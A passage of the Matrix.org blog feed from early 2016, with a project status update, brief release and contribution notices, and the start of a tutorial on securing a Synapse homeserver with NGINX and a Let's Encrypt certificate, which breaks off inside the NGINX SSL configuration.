&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;03&#x2F;android-vector.png&quot; alt=&quot;android-vector&quot; width=&quot;330&quot; height=&quot;640&quot; class=&quot;size-full wp-image-1568&quot; &#x2F;&gt;&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;03&#x2F;Screen-Shot-2016-03-26-at-00.58.48-505x1024.png&quot; alt=&quot;Screen Shot 2016-03-26 at 00.58.48&quot; width=&quot;316&quot; height=&quot;640&quot; class=&quot;size-large wp-image-1569&quot; &#x2F;&gt;
&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;p&gt;The best way of seeing what&#x27;s been going on here is probably by considering Vector itself, which is currently in formal beta (0.4.1 for web, 0.1.2 for iOS and #116 on Android).  The big news includes:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Beta iOS and Android apps.  These are early beta but feedback is very much appreciated - the Android beta can be downloaded from &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;jenkins&#x2F;job&#x2F;VectorAndroidDevelop&#x2F;&quot;&gt;Jenkins&lt;&#x2F;a&gt;; if you want to help beta iOS via TestFlight, come ask on &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#ios:matrix.org&quot;&gt;#ios:matrix.org&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Guest access.  Anyone can jump straight into Matrix by going to http:&#x2F;&#x2F;vector.im without even having to sign up for an account.  Guests are quite restricted on what they can do (and can only join rooms which explicitly have guest access enabled), but this is a *huge* improvement in getting folks using Matrix.&lt;&#x2F;li&gt;
&lt;li&gt;Ability to jump to any message ever - e.g. when clicking through search results or when permalinking a message... using precisely the same UI that you use when chatting.  Permalinks are awesome.  If you want to &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;develop&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&#x2F;$1416420724004tADpi:matrix.org&quot;&gt;randomly jump back in time&lt;&#x2F;a&gt; to the first weeks of #matrix:matrix.org, now you can...&lt;&#x2F;li&gt;
&lt;li&gt;Read Markers, scrolling that remembers the scroll offset per-room, and the ability to jump to unread messages&lt;&#x2F;li&gt;
&lt;li&gt;Synchronised missed notification and missed highlighted notification information per-room&lt;&#x2F;li&gt;
&lt;li&gt;Badge counts for unread notifications&lt;&#x2F;li&gt;
&lt;li&gt;Entirely reworked Room Settings&lt;&#x2F;li&gt;
&lt;li&gt;Entirely reworked User Settings, including push notification configuration&lt;&#x2F;li&gt;
&lt;li&gt;Entirely reworked Room Directory&lt;&#x2F;li&gt;
&lt;li&gt;Lots of performance improvements&lt;&#x2F;li&gt;
&lt;li&gt;Much improved inviting by email&lt;&#x2F;li&gt;
&lt;li&gt;Much improved reliability on video conferencing&lt;&#x2F;li&gt;
&lt;li&gt;Closing literally &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;vector-web&#x2F;issues?q=is%3Aissue+is%3Aclosed&quot;&gt;hundreds and hundreds of bugs&lt;&#x2F;a&gt;...&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;All that remains right now is yet more bugfixing and incorporating feedback from the current betas!  Please give as much feedback as possible in &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#vector:matrix.org&quot;&gt;#vector:matrix.org&lt;&#x2F;a&gt; :)&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;h3 id=&quot;bridges-bots&quot;&gt;Bridges &amp;amp; Bots&lt;&#x2F;h3&gt;
&lt;p&gt;Bridges, bots, and other integrations and application services have inevitably taken slightly lower priority whilst we&#x27;ve been focusing on the core server and client bits of the ecosystem.  However, as of March we&#x27;ve started a major new project to get these moving again, starting with a big update to the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&quot;&gt;IRC Bridge&lt;&#x2F;a&gt;.  This is due to be released next week, but you can get a sneak peek at what&#x27;s going into the release at the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&#x2F;commits&#x2F;develop&quot;&gt;commit log&lt;&#x2F;a&gt;.  Highlights include the ability to persist nicks; connect via IPv6; improve formatted message handling; actually feed error messages from IRC back to Matrix; and much much more.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-verto&quot;&gt;matrix-appservice-verto&lt;&#x2F;a&gt; also got some love, which means that multiway video conferencing powered by FreeSWITCH now works reliably.  The quality still could be improved, but the unreliable call setup that plagued earlier versions is now fixed.&lt;&#x2F;p&gt;
&lt;p&gt;In the next few months we&#x27;re expecting to see a lot more activity on bridges &amp;amp; bots... watch this space :)&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;Update Sat March 26:&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Totally forgot to mention a few of the key new bridges which have been contributed by the community this year - particularly interesting are the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;RocketChat&#x2F;Rocket.Chat.Federation&quot;&gt;Rocket.Chat&amp;lt;-&amp;gt;Matrix bridge&lt;&#x2F;a&gt; written by Sing-Li over at Rocket.Chat which provides basic bridging between the awesome &lt;a href=&quot;http:&#x2F;&#x2F;rocket.chat&quot;&gt;Rocket.Chat&lt;&#x2F;a&gt; collaboration app and the wider Matrix ecosystem.  It&#x27;s early days, but this is incredibly promising for &#x27;hardcoded&#x27; bridging between specific rooms - it just needs Rocket.Chat to support &#x27;virtual&#x27; users and will then be seamless federation.&lt;&#x2F;p&gt;
&lt;p&gt;Similarly, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-gitter&quot;&gt;matrix-appservice-gitter&lt;&#x2F;a&gt; is a Gitter&amp;lt;-&amp;gt;Matrix bridge built by Leonerd on top of the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-bridge&quot;&gt;matrix-appservice-bridge&lt;&#x2F;a&gt; Node library.  Again, it&#x27;s early days but is working well for &#x27;hardcoded&#x27; bridging - supporting dynamic rooms and users is next on the todo list :)&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;h3 id=&quot;the-spec&quot;&gt;The Spec&lt;&#x2F;h3&gt;
&lt;p&gt;We started our formal release process for the spec just before Christmas with r0.0.0 - and released &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;r0.0.1&quot;&gt;r0.0.1&lt;&#x2F;a&gt; in January with &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;r0.0.1&#x2F;client_server.html#changelog&quot;&gt;minor clarifications and updates&lt;&#x2F;a&gt;.  In practice the spec feels quite stable right now, although things have moved on a bit since January and r0.0.2 is definitely overdue at this point.&lt;&#x2F;p&gt;
&lt;p&gt;In the meantime, you can always get the very latest bleeding edge copy of the spec via &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;speculator&quot;&gt;the speculator&lt;&#x2F;a&gt;.  We&#x27;ve also added an initial cut at a spec for the &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;speculator&#x2F;spec&#x2F;HEAD&#x2F;identity_service.html&quot;&gt;Identity Service&lt;&#x2F;a&gt; at last.&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;h3 id=&quot;events&quot;&gt;Events&lt;&#x2F;h3&gt;
&lt;p&gt;We&#x27;ve been focusing on writing code than evangelising Matrix recently, although we did get out to &lt;a href=&quot;&#x2F;blog&#x2F;2016&#x2F;02&#x2F;03&#x2F;fosdem-16-retrospective&#x2F;&quot;&gt;FOSDEM 2016&lt;&#x2F;a&gt; and &lt;a href=&quot;&#x2F;blog&#x2F;2016&#x2F;02&#x2F;09&#x2F;matrix-in-japan&#x2F;&quot;&gt;TADHack Mini Japan and WebRTC Conference&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;706916982960967680&quot;&gt;Enterprise Connect 2016&lt;&#x2F;a&gt; where we showed off Matrix &amp;amp; Vector in the WebRTC Real World Innovation showcase.&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;h3 id=&quot;gsoc&quot;&gt;GSoC&lt;&#x2F;h3&gt;
&lt;p&gt;We are incredibly grateful to have been accepted as an organisation into Google Summer of Code 2016!  The last two weeks have been the window for students to propose projects to us that they could work on over the course of the summer, and it&#x27;s been fascinating to meet the GSoCers and see a whole new community pop up on Matrix and advise and mentor applicants through their proposals.  At the last count we&#x27;ve received 35 proposals, many inspired by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;GSoC&#x2F;blob&#x2F;master&#x2F;IDEAS.md&quot;&gt;our list of ideas&lt;&#x2F;a&gt;, including some really impressive candidates - many thanks to all the students who have applied to us.  We don&#x27;t know yet how many slots Google will allocate to us, but one way or another we&#x27;re really looking forward to helping the GSoCers make the most out of their summer of Matrix!  All GSoC discussion is happening in &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#gsoc:matrix.org&quot;&gt;#gsoc:matrix.org&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;h3 id=&quot;what-s-next&quot;&gt;What&#x27;s next?&lt;&#x2F;h3&gt;
&lt;p&gt;In no particular order, the urgent stuff that still remains includes:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Continuing to polish synapse and build out dendron-based clustering&lt;&#x2F;li&gt;
&lt;li&gt;Building as many bridges, bots and other integrations as possible&lt;&#x2F;li&gt;
&lt;li&gt;The matrix.to URL-handler service: having client-agnostic https:&#x2F;&#x2F;matrix.to&#x2F;#matrix:matrix.org URLs to help with sharing matrix room aliases etc&lt;&#x2F;li&gt;
&lt;li&gt;End-to-end crypto.  No progress since December; we need to get back to it asap.&lt;&#x2F;li&gt;
&lt;li&gt;Exiting Vector from beta&lt;&#x2F;li&gt;
&lt;li&gt;Finishing the server-to-server API specification&lt;&#x2F;li&gt;
&lt;li&gt;Improving the security model for access_tokens&lt;&#x2F;li&gt;
&lt;li&gt;Editable messages&lt;&#x2F;li&gt;
&lt;li&gt;Pinned, tagged, and &#x27;liked&#x27; messages&lt;&#x2F;li&gt;
&lt;li&gt;Threading&lt;&#x2F;li&gt;
&lt;li&gt;Decentralised accounts&lt;&#x2F;li&gt;
&lt;li&gt;Decentralised reputation&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;In practice, Bridging and E2E crypto is likely to get the most attention first (beyond the standard ongoing polishing).  There&#x27;s obviously a significant amount of work there, but we expect to see benefits pretty quickly throughout Matrix - especially from bridging.  Hopefully it&#x27;s true to say that the next few months should be quite transformational :D&lt;&#x2F;p&gt;
&lt;p&gt;Anyway, thanks for reading this sprawling update and for supporting Matrix.  And please come say hi in &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt; if you have any questions :)&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Matthew, Amandine &amp;amp; the Matrix.org team.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Add Your Matrix Project</title>
        <published>2016-02-25T00:00:00+00:00</published>
        <updated>2016-02-25T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/02/25/add-your-matrix-project/" type="text/html"/>
        <id>https://matrix.org/blog/2016/02/25/add-your-matrix-project/</id>
        
        <content type="html">&lt;p&gt;The &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;projects&#x2F;try-matrix-now.html&quot;&gt;try-matrix-now&lt;&#x2F;a&gt; page is now being generated by &lt;a href=&quot;https:&#x2F;&#x2F;jekyllrb.com&#x2F;&quot;&gt;jekyll&lt;&#x2F;a&gt; and all the project pages have been moved to the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;tree&#x2F;master&#x2F;supporting-docs&#x2F;projects&quot;&gt;matrix-doc&lt;&#x2F;a&gt; project on github. &lt;&#x2F;p&gt;
&lt;p&gt;The idea is to make it very easy for anyone to add or update a project entry. All you need to do is to submit a PR with the project details; feel free to start with the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;master&#x2F;supporting-docs&#x2F;projects&#x2F;template.md&quot;&gt;template&lt;&#x2F;a&gt;, and you can also add images (thumbnail and&#x2F;or a main picture for the project page) to the images subfolder (just use the same relative URL that is in the template). Any kind of project using Matrix is welcome; if you are unsure which category to use, just use &amp;quot;other&amp;quot;.&lt;&#x2F;p&gt;
&lt;p&gt;Jekyll requires a date in the project filename; we use the date to sort the various project lists (newest projects first). It might be best to submit new entries with a date like 2015-01-01.&lt;&#x2F;p&gt;
&lt;p&gt;Any questions or comments? Come talk to us in &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Android Matrix Console 0.5.3</title>
        <published>2016-02-16T00:00:00+00:00</published>
        <updated>2016-02-16T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/02/16/android-matrix-console-0-5-3/" type="text/html"/>
        <id>https://matrix.org/blog/2016/02/16/android-matrix-console-0-5-3/</id>
        
        <content type="html">&lt;p&gt;We have put an updated version of the Android Matrix Console app (v0.5.3) on the Play store!&lt;&#x2F;p&gt;
&lt;p&gt;This release mainly includes performance improvements, such as using the new &amp;quot;V2&amp;quot; sync API, and other optimisations which should make your user experience a lot nicer. There&#x27;s also a few new features in the SDK (e.g. tags support) - these will be added to the app hopefully soon.&lt;&#x2F;p&gt;
&lt;p&gt;For the full list of changes, look at the CHANGES files in the android &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-console&#x2F;blob&#x2F;master&#x2F;CHANGES.rst&quot;&gt;console&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-sdk&#x2F;blob&#x2F;master&#x2F;CHANGES.rst&quot;&gt;SDK&lt;&#x2F;a&gt; projects&lt;&#x2F;p&gt;
&lt;p&gt;Get it from the &lt;a href=&quot;https:&#x2F;&#x2F;play.google.com&#x2F;store&#x2F;apps&#x2F;details?id=org.matrix.androidsdk.alpha&quot;&gt;Google play store&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;Enjoy! And please do let us know your feedback in &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#android:matrix.org&quot;&gt;#android:matrix.org&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Advanced Synapse setup with Let&#x27;s Encrypt</title>
        <published>2016-02-10T00:00:00+00:00</published>
        <updated>2016-02-10T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/02/10/advanced-synapse-setup-with-let-s-encrypt/" type="text/html"/>
        <id>https://matrix.org/blog/2016/02/10/advanced-synapse-setup-with-let-s-encrypt/</id>
        
        <content type="html">&lt;p&gt;So, you&#x27;ve installed an configured synapse and started chatting from your very own Matrix home server? What&#x27;s the next step? Well, right now you&#x27;re probably accessing your new home server over plaintext HTTP, which is bad, particularly because you&#x27;ll be sending your password over this connection when you log in. You could connect to Synapse&#x27;s secure HTTP port, but your browser won&#x27;t trust it by default because you&#x27;d normally need to pay for a certificate that your browser would recognise. That is, until recently!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;letsencrypt.org&#x2F;&quot; target=&quot;_blank&quot;&gt;Let&#x27;s Encrypt&lt;&#x2F;a&gt; is a new initiative that issues SSL certificates free of charge, in an effort to make SSL universal on the Internet. In this blog post, we&#x27;ll be walking through an example of how we can use this service to get ourselves a securely hosted Synapse.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;re going to assume you have a Synapse installed and listening on the standard ports, 8008 and 8448. If not, follow the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;README.rst&quot; target=&quot;_blank&quot;&gt;Synapse README&lt;&#x2F;a&gt; and come back here when you&#x27;re done. Everybody ready? Okay, good.&lt;&#x2F;p&gt;
&lt;p&gt;So, in order to get a certificate from Let&#x27;s Encrypt, we need to prove that we own our domain. The simplest way to do this is to host some special files on our web server. Now, Synapse won&#x27;t do this. We could use a separate web server, but then we&#x27;d have to stop Synapse and start the other web server every time we renewed our certificate, and that means downtime. Instead, let&#x27;s put our Synapse behind a proper web server and let that serve the files. This has added advantages, including that we can host our Matrix home server on the standard port 443 without having to run Synapse as root.&lt;&#x2F;p&gt;
&lt;p&gt;For this example, we&#x27;re going to use NGINX, so start by installing NGINX in whatever way your Linux distribution of choice recommends.&lt;&#x2F;p&gt;
&lt;p&gt;Now, you should have a webroot for your new web server somewhere. Hopefully your helpful Linux distribution has started you off with a config file - let&#x27;s see:&lt;&#x2F;p&gt;
&lt;pre&gt;# nano &#x2F;etc&#x2F;nginx&#x2F;nginx.conf
&lt;&#x2F;pre&gt;
&lt;p&gt;We&#x27;re looking for the &#x27;server&#x27; section of that file. We need to make it look something like this:&lt;&#x2F;p&gt;
&lt;pre&gt;    server {&#x27;{&#x27;}
        # Make sure this is 0.0.0.0: no use listening on 127.0.0.1 or we&#x27;ll only be
        # serving to ourselves! There&#x27;s no port here, which means we&#x27;ll listen on
        # port 80
        listen 0.0.0.0;

        server_name example.com www.example.com;

        access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;example.com.access_log main;
        error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;example.com info;

        # This is where we put the files we want on our site
        root &#x2F;var&#x2F;www&#x2F;examplecom&#x2F;htdocs;

        # Here&#x27;s where it gets interesting: This will send any path that starts
        # with &#x2F;_matrix to our Synapse!

        location &#x2F;_matrix {&#x27;{&#x27;}
            proxy_pass http:&#x2F;&#x2F;localhost:8008;
        {&#x27;}&#x27;}
    {&#x27;}&#x27;}
&lt;&#x2F;pre&gt;
&lt;p&gt;When you&#x27;re happy with the look of that file, let&#x27;s restart the server:&lt;&#x2F;p&gt;
&lt;pre&gt;# nginx -s reload
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Before we go any further, let&#x27;s test our new configuration:&lt;&#x2F;p&gt;
&lt;pre&gt;$ curl http:&#x2F;&#x2F;example.com&#x2F;_matrix&#x2F;key&#x2F;v2&#x2F;server&#x2F;auto
{&#x27;{&#x27;}&quot;old_verify_keys&quot;:{&#x27;{&#x27;}{&#x27;}&#x27;},&quot;server_name&quot;:&quot;example.com&quot;,&quot;signatures&quot;:{&#x27;{&#x27;}&quot;example.com&quot;:{&#x27;{&#x27;}&quot;ed25519:auto&quot;:&quot;RWb+w6vHUUokoDgElwG6Cg50ezZvBrzXtJmJIH8jEwI5x0JQ7prn3FwjhbgKTH5jE7J8Ily3HEc4COn4JCCvCA&quot;{&#x27;}&#x27;}{&#x27;}&#x27;},&quot;tls_fingerprints&quot;:[{&#x27;{&#x27;}&quot;sha256&quot;:&quot;DMbzSZ5Uj7&#x2F;6p&#x2F;RT&#x2F;UtQYJLHm5o0TwBSVYXsqpDdVDs&quot;{&#x27;}&#x27;}],&quot;valid_until_ts&quot;:1455203001035,&quot;verify_keys&quot;:{&#x27;{&#x27;}&quot;ed25519:auto&quot;:{&#x27;{&#x27;}&quot;key&quot;:&quot;1YiTDjmE86AlmrbIYE2lyqauV9wPo8jw2kxZAZFfl&#x2F;Q&quot;{&#x27;}&#x27;}{&#x27;}&#x27;}{&#x27;}&#x27;}
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Those are your server&#x27;s public keys! Now we have a web server running, we can get our SSL certificate. Let&#x27;s Encrypt have their own client which will automate everything including rewriting your NGINX config file, however that means it has a large number of dependencies and needs to be run as root. For this example, we&#x27;re going to use the much simpler &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;diafygi&#x2F;acme-tiny&quot; target=&quot;_blank&quot;&gt;acme_tiny.py&lt;&#x2F;a&gt;. I&#x27;m going to assume you have a user called, &#x27;letsencrypt&#x27;, so, as root, let&#x27;s set up the place for it to write its challenge files:&lt;&#x2F;p&gt;
&lt;pre&gt;# mkdir &#x2F;var&#x2F;www&#x2F;examplecom&#x2F;htdocs&#x2F;.well-known&#x2F;acme-challenge
# chown letsencrypt:users &#x2F;var&#x2F;www&#x2F;examplecom&#x2F;htdocs&#x2F;.well-known&#x2F;acme-challenge
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Now let&#x27;s switch to our letsencrypt user:&lt;&#x2F;p&gt;
&lt;pre&gt;$ ssh letsencrypt@example.com
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;We&#x27;ll start by getting ourselves a copy of acme_tiny.py:&lt;&#x2F;p&gt;
&lt;pre&gt;$ git clone https:&#x2F;&#x2F;github.com&#x2F;diafygi&#x2F;acme-tiny.git
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Now let&#x27;s set up a directory structure (let&#x27;s say we might want to manage more than one domain someday):&lt;&#x2F;p&gt;
&lt;pre&gt;$ mkdir examplecom
$ cd examplecom
$ ln -s &#x2F;var&#x2F;www&#x2F;examplecom&#x2F;htdocs&#x2F;.well-known&#x2F;acme-challenge challenges
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Now, we&#x27;ll need to generate two keys for Let&#x27;s Encrypt, and account key and a domain key. The former is what we use to identify ourselves to Let&#x27;s Encrypt and the latter is the key we use to do the actual SSL.&lt;&#x2F;p&gt;
&lt;pre&gt;$ openssl genrsa 4096 &amp;gt; letsencrypt_examplecom_account.key
Generating RSA private key, 4096 bit long modulus
..++
.................................................................................................................................................................................................................................................................................................................................................................................................................++
e is 65537 (0x10001)
$ chmod 600 letsencrypt_examplecom_account.key
$ openssl genrsa 4096 &amp;gt; letsencrypt_examplecom_domain.key
Generating RSA private key, 4096 bit long modulus
.............++
.............................................................................................................................................................................................++
e is 65537 (0x10001)
$ chmod 600 letsencrypt_examplecom_domain.key
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Now, store those keys somewhere safe! After you&#x27;ve done that, let&#x27;s generate a certificate request for our domain. Note that we&#x27;re requesting one for both example.com and www.example.com: this isn&#x27;t strictly necessary for Matrix but could be useful if we want to host a website too.&lt;&#x2F;p&gt;
&lt;pre&gt;$ openssl req -new -sha256 -key letsencrypt_examplecom_domain.key -subj &quot;&#x2F;&quot; -reqexts SAN -config &amp;lt;(cat &#x2F;etc&#x2F;ssl&#x2F;openssl.cnf &amp;lt;(printf &quot;[SAN]\\nsubjectAltName=DNS:example.com,DNS:www.example.com&quot;)) &amp;gt; examplecom.csr
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Okay, we have our keys, our certificate request, and somewhere to host our challenge files, so we&#x27;re ready to request a certificate! Be careful about this part and make sure you&#x27;ve got everything right, because Let&#x27;s Encrypt enforce strict rate limits on the number of certificates you can request for one domain. Here we go:&lt;&#x2F;p&gt;
&lt;pre&gt;$ python ~&#x2F;acme-tiny&#x2F;acme_tiny.py --account letsencrypt_examplecom_account.key --csr examplecom.csr --acme-dir challenges&#x2F; &amp;gt; examplecom.crt
Parsing account key...
Parsing CSR...
Registering account...
Registered!
Verifying example.com...
example.com verified!
Verifying www.example.com...
www.example.com verified!
Signing certificate...
Certificate signed!
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Is that it, did it work? Well, let&#x27;s see:&lt;&#x2F;p&gt;
&lt;pre&gt;$ openssl x509 -in examplecom.crt -noout -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            01:02:22:77:02:1b:eb:d5:3d:c3:14:6d:87:43:22:3d:fc:0f
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=US, O=Let&#x27;s Encrypt, CN=Let&#x27;s Encrypt Authority X3
        Validity
            Not Before: Feb  6 21:37:00 2016 GMT
            Not After : May  6 21:37:00 2016 GMT
        Subject: CN=example.com
        Subject Public Key Info:
[etc]
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Congratulations, you have an official, signed certificate for your domain! Now, before we can use it, we need to add the Let&#x27;s Encrypt certificate to it, because our web server needs to send both:&lt;&#x2F;p&gt;
&lt;pre&gt;$ wget https:&#x2F;&#x2F;letsencrypt.org&#x2F;certs&#x2F;lets-encrypt-x3-cross-signed.pem
--2016-02-06 23:38:55--  https:&#x2F;&#x2F;letsencrypt.org&#x2F;certs&#x2F;lets-encrypt-x3-cross-signed.pem
Resolving letsencrypt.org... 23.66.17.98, 2a02:26f0:60:489::2a1f, 2a02:26f0:60:481::2a1f
Connecting to letsencrypt.org|23.66.17.98|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1675 (1.6K) [application&#x2F;x-x509-ca-cert]
Saving to: ‘lets-encrypt-x3-cross-signed.pem&#x27;
lets-encrypt-x3-cross-signed.pe 100%[======================================================&amp;gt;]   1.64K  --.-KB&#x2F;s   in 0s
2016-02-06 23:38:55 (61.5 MB&#x2F;s) - ‘lets-encrypt-x3-cross-signed.pem&#x27; saved [1675&#x2F;1675]
$ cat examplecom&#x2F;examplecom.crt lets-encrypt-x3-cross-signed.pem &amp;gt;examplecom&#x2F;examplecom_cert_chain.crt
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Now&#x27;s let&#x27;s symlink it in place, along with the domain key, so we can renew it easily later. We&#x27;ll need to be root again for this:&lt;&#x2F;p&gt;
&lt;pre&gt;$ ssh root@example.com
# ln -s &#x2F;home&#x2F;letsencrypt&#x2F;examplecom&#x2F;examplecom_cert_chain.crt &#x2F;etc&#x2F;ssl&#x2F;nginx&#x2F;examplecom_cert.pem
# ln -s &#x2F;home&#x2F;letsencrypt&#x2F;examplecom&#x2F;letsencrypt_examplecom_domain.key &#x2F;etc&#x2F;ssl&#x2F;nginx&#x2F;examplecom_key.pem
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Now, one more crucial thing we have to do before using our SSL is to give NGINX some Diffie Hellman parameters. This is a good thing to do for any SSL configuration (it will increase your score on &lt;a href=&quot;https:&#x2F;&#x2F;www.ssllabs.com&#x2F;ssltest&#x2F;&quot; target=&quot;_blank&quot;&gt;SSL Labs&lt;&#x2F;a&gt;) but it&#x27;s absolutely crucial for us because Synapse will only negotiate forward secret connections, so otherwise other Matrix home servers will refuse to talk to us! (Technically, Synapse also support elliptic curve Diffie Hellman, which doesn&#x27;t need DH parameters, but not all Synapses will support this.) You&#x27;ll already have some Diffie Hellman parameters from you existing Synapse, so you could use them:&lt;&#x2F;p&gt;
&lt;pre&gt;# cp &#x2F;home&#x2F;synapse&#x2F;synapse&#x2F;matrix.example.com.tls.dh &#x2F;etc&#x2F;ssl&#x2F;nginx&#x2F;examplecom_dhparams.pem
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;...or you can generate your own. You&#x27;ll probably want to do this on your desktop or laptop if you have OpenSSL installed, it will be much faster:&lt;&#x2F;p&gt;
&lt;pre&gt;$ openssl dhparam -out examplecom_dhparams.pem 2048
Generating DH parameters, 2048 bit long safe prime, generator 2
This is going to take a long time
........................................................+................[etc, etc]
$ scp examplecom_dhparams.pem root@example.com:&#x2F;etc&#x2F;ssl&#x2F;nginx&#x2F;examplecom_dhparams.pem
&lt;&#x2F;pre&gt;
&lt;p class=&quot;p1&quot;&gt;Now, let&#x27;s get our new certificate in action! Open up your NGINX config file again, and add another server block that look like this:&lt;&#x2F;p&gt;
&lt;pre&gt;    server {&#x27;{&#x27;}
        listen 0.0.0.0:443;
        server_name example.com www.example.com;
        ssl on;
        ssl_certificate &#x2F;etc&#x2F;ssl&#x2F;nginx&#x2F;examplecom_crt.pem;
        ssl_certificate_key &#x2F;etc&#x2F;ssl&#x2F;nginx&#x2F;examplecom_key.pem;
        ssl_dhparam &#x2F;etc&#x2F;ssl&#x2F;nginx&#x2F;examplecom_dhparams.pem;
        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
        ssl_prefer_server_ciphers on;
        # mozilla intermediate list, jan 2016
